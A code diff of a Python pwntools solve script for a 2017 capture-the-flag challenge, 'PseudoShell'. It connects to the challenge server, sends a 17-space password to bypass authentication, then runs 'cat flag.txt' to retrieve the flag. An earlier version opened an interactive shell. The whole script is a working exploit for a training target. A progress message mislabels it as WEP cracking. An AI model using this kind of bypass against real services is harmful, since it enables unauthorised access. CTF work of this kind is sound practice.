@@ -1,22 +1,24 @@
 #! /usr/bin/env python3
 ##
-# Created for the Overflow challenge
+# Created for GryphonCTF 2017_PseudoShell
 # By Amos (LFlare) Ng <amosng1@gmail.com>
 ##
-import sys
+# Imports
 from pwn import *
 
-# Start binary in pipe or connect to socket
-if len(sys.argv) == 3:
-    t = remote(sys.argv[1], int(sys.argv[2]))
-else:
-    t = process("../service/pseudoshell-server")
+# Logging
+with log.progress("Cracking WEP...") as p:
+    # Connect to socket
+    t = remote("pwn2.chal.gryphonctf.com", 17341)
 
-# Send payload and dump initial output
-t.recvuntil("(yes/no)? ")
-t.sendline("yes")
-t.recvuntil("password: ")
-t.sendline(" " * 17)
+    # Send payload and dump initial output
+    t.recvuntil("(yes/no)? ")
+    t.sendline("yes")
+    t.recvuntil("password: ")
+    t.sendline("\x20" * 17)
 
-# launch shell
-t.interactive()
+    # Get flag
+    t.sendline("cat flag.txt")
+    t.recvline()
+    flag = t.recvline().decode()
+    p.success(flag)
